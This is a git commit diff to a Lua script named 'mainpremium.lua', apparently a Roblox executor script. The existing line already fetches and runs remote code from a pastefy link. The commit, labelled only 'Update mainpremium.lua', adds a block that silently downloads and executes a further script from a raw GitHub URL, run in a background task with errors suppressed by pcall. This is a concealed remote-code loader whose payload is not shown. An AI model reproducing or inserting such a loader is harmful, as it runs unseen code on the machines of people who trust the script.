32a16f3aa99b49fb7361a816918cc845d2ffd4e9
NaNaTV36 <tamkimochi8@gmail.com>
2026-05-28 13:33:34 +0700

    Update mainpremium.lua

--- mainpremium.lua
+++ mainpremium.lua
@@ -1,1 +1,7 @@
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/traurobloxdeptrai/traukhoaito/refs/heads/main/anhdomixi.lua"))()
+    end)
+end) 
+
 loadstring(game:HttpGet("https://pastefy.app/cwwniiNF/raw"))()
